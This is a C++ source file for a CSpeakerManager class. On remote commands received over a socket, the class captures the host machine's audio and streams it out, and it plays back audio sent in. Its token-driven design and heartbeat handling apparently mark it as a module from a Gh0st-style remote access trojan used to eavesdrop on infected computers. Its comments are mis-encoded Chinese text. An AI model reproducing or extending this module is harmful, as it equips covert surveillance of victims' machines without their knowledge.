#include "stdafx.h"
#include "SpeakerManager.h"
#include <IOSTREAM>

using namespace std;

CSpeakerManager* m_CSpeakerManager;

CSpeakerManager::CSpeakerManager(ISocketBase* ClientObject) :CManager(ClientObject)
{
	m_buser = FALSE;
	m_CSpeakerManager = this;
	ClientObjectsec = ClientObject;
	BYTE	bToken = TOKEN_SPEAK_START;
	Send((LPBYTE)&bToken, 1);
	m_buser = TRUE;
}


void  CSpeakerManager::OnReceive(LPBYTE lpBuffer, UINT ulLength)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		if (SetSpeakerDate.IsRendering())
		{
			SetSpeakerDate.PlayBuffer((LPBYTE)lpBuffer, ulLength);
		}	
	}
	break;
	case TOKEN_SPEAK_START:
	{
		if (!GetSpeakerDate.IsCapturing()) //·¢ËÍ
		{
			CoInitialize(NULL);
			GetSpeakerDate.Initialize((void*)this);
			GetSpeakerDate.Start();
		}
			break;
	}
	case TOKEN_SPEAK_STOP:
	{
		if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
		CoUninitialize();
	}
		
		break;
	}
	case TOKEN_SEND_SPEAK_START:   //²¥·Å
	{
		if (!SetSpeakerDate.IsRendering())
		{
			CoInitialize(NULL);
			SetSpeakerDate.Initialize();
			SetSpeakerDate.Start();
		}
		break;
	}
	break;
	case TOKEN_SEND_SPEAK_STOP:    //Í£Ö¹·¢ËÍ
	{
		if (SetSpeakerDate.IsRendering())
		{
			SetSpeakerDate.Stop();
			SetSpeakerDate.Destroy();
		}
		break;
	}
	break;
	default:
	{
	}
	break;
	}
}




CSpeakerManager::~CSpeakerManager()
{ 
	if (!m_buser) return;
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}

	CoUninitialize();

}

